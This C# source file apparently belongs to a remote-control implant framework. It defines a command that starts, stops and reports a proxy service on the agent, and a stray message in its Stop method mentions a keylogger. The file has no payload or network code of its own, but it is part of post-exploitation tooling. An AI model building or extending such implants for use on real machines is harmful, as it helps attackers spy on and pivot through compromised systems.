using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Agent.Service;
using Shared;

namespace Agent.Commands.Services
{
    internal class ProxyCommand : RunningServiceCommand<IProxyService>
    {
        public override CommandId Command => CommandId.Proxy;

        protected override async Task Start(AgentTask task, AgentCommandContext context)
        {
            if (this.Service.Status == RunningService.RunningStatus.Running)
            {
                context.AppendResult("Proxy is already running!");
                return;
            }

            this.Service.Start();
            context.AppendResult($"Proxy started");
        }

        protected override async Task Stop(AgentTask task, AgentCommandContext context)
        {
            if (this.Service.Status != RunningService.RunningStatus.Running)
            {
                context.AppendResult("Key Logger is not running!");
                return;
            }

            this.Service.Stop();
            context.AppendResult("Proxy stopped" + Environment.NewLine);
        }

        protected override async Task Show(AgentTask task, AgentCommandContext context)
        {
            if (this.Service.Status == RunningService.RunningStatus.Running)
                context.AppendResult("Proxy is running!");
            else
                context.AppendResult("Proxy is stopped!");
            return;
        }
    }
}
